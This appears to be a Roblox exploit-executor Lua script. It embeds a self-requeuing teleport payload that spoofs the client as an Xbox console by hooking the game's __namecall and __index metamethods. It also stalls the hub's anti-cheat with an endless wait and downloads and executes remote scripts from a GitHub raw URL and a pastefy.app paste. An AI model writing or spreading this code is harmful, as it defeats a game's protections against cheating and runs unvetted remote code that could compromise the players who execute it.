local CONSOLE_QOT_FILE = "experiment_console_qot.lua"

-- Runs on every teleport: hub (10179538382) -> console (15124180230), and keeps the spoof alive.
local CONSOLE_QOT_PAYLOAD = [[
local HUB_PLACE = 10179538382
local PC_PLACE = 13643807539
local CONSOLE_PLACE = 15124180230
local QOT_FILE = "experiment_console_qot.lua"

local function get_queue()
    return queue_on_teleport
        or (syn and syn.queue_on_teleport)
        or (fluxus and fluxus.queue_on_teleport)
        or (secure_load and secure_load.queue_on_teleport)
        or KRNL_QUEUE_ON_TELEPORT
end

-- Re-queue before anything else so hub -> 15124180230 still has IsTenFootInterface.
-- Only keep chaining on hub/console; stop if you land on PC servers.
local qt = get_queue()
if qt and (game.PlaceId == HUB_PLACE or game.PlaceId == CONSOLE_PLACE or game.PlaceId == 0) then
    qt("loadstring(readfile('" .. QOT_FILE .. "'))()")
end

local function apply_console_hooks()
    if getgenv().__ExperimentConsoleHooked then
        return
    end
    getgenv().__ExperimentConsoleHooked = true

    local UserInputService = game:GetService("UserInputService")
    local GuiService = game:GetService("GuiService")

    local OldNamecall
    OldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
        local Method = getnamecallmethod()

        -- Spoof first so Traceback hang never blocks console join.
        if Method == "IsTenFootInterface" then
            return true
        elseif Method == "GetPlatform" then
            return Enum.Platform.XBoxOne
        end

        -- Hub AC stall only (never on console place).
        if game.PlaceId == HUB_PLACE then
            local Traceback = debug.traceback()
            if Traceback:match("PlayerGui") then
                local lp = game:GetService("Players").LocalPlayer
                local SourceName = Traceback:gsub(
                    string.format("Players.%s.PlayerGui.", lp.Name),
                    ""
                )
                if SourceName:len() > 32 then
                    return task.wait(9e9)
                end
            end
        end

        return OldNamecall(self, ...)
    end))

    pcall(function()
        local OldIsTenFootInterface
        OldIsTenFootInterface = hookfunction(GuiService.IsTenFootInterface, newcclosure(function(self)
            if not checkcaller() then
                return true
            end
            return OldIsTenFootInterface(self)
        end))
    end)

    local oldIndex
    oldIndex = hookmetamethod(game, "__index", newcclosure(function(self, index)
        if checkcaller() then
            return oldIndex(self, index)
        end
        if self == UserInputService and tostring(getcallingscript()) ~= "ControlModule" then
            if index == "TouchEnabled"
                or index == "MouseEnabled"
                or index == "KeyboardEnabled" then
                return false
            elseif index == "GamepadEnabled"
                or index == "ControllerEnabled" then
                return true
            end
        end
        return oldIndex(self, index)
    end))
end

apply_console_hooks()

if game.PlaceId == HUB_PLACE then
    game:GetService("ScriptContext"):SetTimeout(1)

    local HyphonScript = nil
    local function FindHyphonScript()
        for _, Object in pairs(getnilinstances()) do
            if Object:IsA("Script") and Object.Name:len() == 32 then
                HyphonScript = Object
            end
        end
    end
    repeat
        FindHyphonScript()
        task.wait()
    until HyphonScript

    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/d4e6f8a0b2c4d6e8f0a2c4e6f8a0b2c4d6/cloudflare-global/refs/heads/main/asdwasd.lua"))()
    end)

    -- Re-queue again after loader in case it overwrote queue_on_teleport.
    qt = get_queue()
    if qt then
        qt("loadstring(readfile('" .. QOT_FILE .. "'))()")
    end
elseif game.PlaceId == PC_PLACE then
    repeat task.wait() until not game.ReplicatedFirst:FindFirstChild("Intro")
    game:GetService("ScriptContext"):SetTimeout(9e9)
elseif game.PlaceId == CONSOLE_PLACE then
    repeat task.wait() until game:IsLoaded()
    task.wait(.3)
    pcall(function()
    loadstring(game:HttpGet("https://pastefy.app/DdpWWNDc/raw"))()
    repeat task.wait() until HyphonReady == true
end)
end
]]
